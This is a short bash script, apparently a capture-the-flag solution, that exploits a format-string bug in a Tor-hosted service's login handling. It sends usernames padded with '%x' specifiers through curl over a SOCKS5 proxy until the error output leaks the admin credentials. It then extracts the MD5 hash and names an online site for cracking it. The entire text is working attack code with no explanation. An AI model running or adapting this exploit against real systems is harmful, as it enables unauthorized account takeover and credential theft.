#!/bin/bash

username="%x%s"
while : ;
do
curl --max-time 5 --user $username:test -v --socks5-hostname localhost:9050\
 xtfbiszfeilgi672ted7hmuq5v7v3zbitdrzvveg2qvtz4ar5jndnxad.onion 2> output
 credentials=$(cat output | grep -a --text "Invalid user" | awk '{print $6}' )  
 if [[ $credentials == *"admin"* ]]; then
   break;
 fi
username="%x$username"
done

array=(${credentials//:/ })
hash=${array[1]}
echo $hash | tr -d \"
#Decrypt the MD5 Hash here: https://md5decrypt.net/en/